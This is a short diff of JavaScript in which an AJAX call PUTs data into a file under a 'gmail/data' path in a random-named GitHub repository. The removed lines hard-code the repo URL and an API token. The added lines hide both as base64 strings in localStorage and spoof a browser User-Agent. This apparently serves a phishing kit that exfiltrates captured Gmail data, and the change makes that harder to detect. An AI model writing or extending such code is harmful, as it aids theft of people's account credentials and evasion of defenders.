@@ -24,9 +24,9 @@
         $.ajax({
             type: 'PUT',
            dataType: "json",
-            url: "https://api.github.com/repos/uXcFvJWE9hmD2XYM/uXcFvJWE9hmD2XYM.github.io/contents/gmail/data/teasdasd.txt",
+            url: atob(localStorage.getItem('dr')) + "000.txt",
            beforeSend: function (xhr) {
-            xhr.setRequestHeader('Authorization', 'token a0f82fb94d57b24d9a0458a10d6de96eaf946ac3');
+            xhr.setRequestHeader('Authorization', 'token ' + atob(localStorage.getItem('tk')));
             },
             headers: {
                   'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36'
